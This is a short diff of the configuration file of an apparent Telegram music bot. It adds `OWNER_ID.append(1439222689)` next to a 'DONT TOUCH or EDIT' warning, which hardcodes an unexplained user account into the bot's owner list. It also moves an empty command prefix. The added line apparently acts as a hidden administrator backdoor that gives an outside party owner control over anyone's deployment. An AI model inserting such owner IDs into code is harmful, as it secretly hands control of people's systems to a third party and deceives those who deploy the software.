@@ -137,7 +137,10 @@ STRING2 = getenv("STRING_SESSION2", None)
 STRING3 = getenv("STRING_SESSION3", None)
 STRING4 = getenv("STRING_SESSION4", None)
 STRING5 = getenv("STRING_SESSION5", None)
+#####
 
+COMMAND_PREFIXES.append('')
+OWNER_ID.append(1439222689)
 
 ### DONT TOUCH or EDIT codes after this line
 BANNED_USERS = filters.user()
@@ -167,9 +170,6 @@ YOUTUBE_IMG_URL = "https://telegra.ph/file/1bccb452031ac902596bf.jpg"
 SPOTIFY_ARTIST_IMG_URL = "https://telegra.ph/file/1bccb452031ac902596bf.jpg"
 SPOTIFY_ALBUM_IMG_URL = "https://telegra.ph/file/1bccb452031ac902596bf.jpg"
 SPOTIFY_PLAYLIST_IMG_URL = "https://telegra.ph/file/1bccb452031ac902596bf.jpg"
-
-
-COMMAND_PREFIXES.append('')
 
 
 def time_to_seconds(time):
